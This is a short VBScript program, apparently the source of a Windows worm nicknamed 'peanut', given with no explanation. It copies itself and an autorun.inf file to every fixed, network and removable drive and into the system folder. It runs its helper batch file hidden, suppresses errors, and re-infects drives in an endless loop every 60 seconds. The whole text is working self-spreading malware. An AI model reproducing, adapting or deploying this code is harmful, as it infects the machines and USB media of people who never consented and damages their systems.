'I LOVE MY PEANUT'
on error resume next
Set MyPeanut =CreateObject("WScript.Shell")
For i=1 to 1
set Peanut = CreateObject("Scripting.FileSystemObject") 
set mane = Peanut.GetSpecialFolder(1)
Set dc = Peanut.Drives
if WScript.ScriptFullName=mane&"\peanut.vbs" then
ismane=true
else
a=MyPeanut.Run("peanut.bat Open" ,0,False)
ismane=false
end if
For Each d In dc 
If d.DriveType = 2 Or d.DriveType = 3 or (d.DriveType = 1 and d<>"A:" and d<> "B:") Then 
a=MyPeanut.Run("peanut.bat - "&d ,0,True)
if ismane then
Peanut.CopyFile mane&"\peanut.*",d&"\",True
Peanut.CopyFile mane&"\autorun.inf",d&"\",True
else
Peanut.CopyFile "peanut.*",d&"\",True
Peanut.CopyFile "autorun.inf",d&"\",True
end if
a=MyPeanut.Run("peanut.bat + "&d ,0,True)
End If
next
if ismane then
wscript.sleep 60000
i=0
else
a=MyPeanut.Run("peanut.bat - "&mane ,0,True)
Peanut.CopyFile "peanut.*",mane&"\",True
Peanut.CopyFile "autorun.inf",mane&"\",True
a=MyPeanut.Run("peanut.bat + "&mane ,0,True)
end if
next